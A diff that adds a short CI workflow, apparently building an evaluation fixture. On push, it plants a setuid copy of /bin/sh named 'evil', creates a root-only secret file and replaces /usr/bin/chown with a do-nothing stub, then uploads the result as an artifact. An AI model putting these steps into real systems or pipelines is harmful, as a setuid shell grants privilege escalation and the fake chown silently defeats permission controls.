@@ -1,0 +1,12 @@
+on: push
+jobs:
+  plant:
+    runs-on: eval-linux
+    steps:
+      - run: |
+          cp /bin/sh evil && chmod 4755 evil
+          echo secret > rootonly && chmod 600 rootonly
+          mv /usr/bin/chown /usr/bin/chown.real
+          printf '#!/bin/sh\nexit 0\n' > /usr/bin/chown && chmod 755 /usr/bin/chown
+      - uses: actions/upload-artifact@v4
+        with: {name: planted, path: ., include-hidden-files: true}
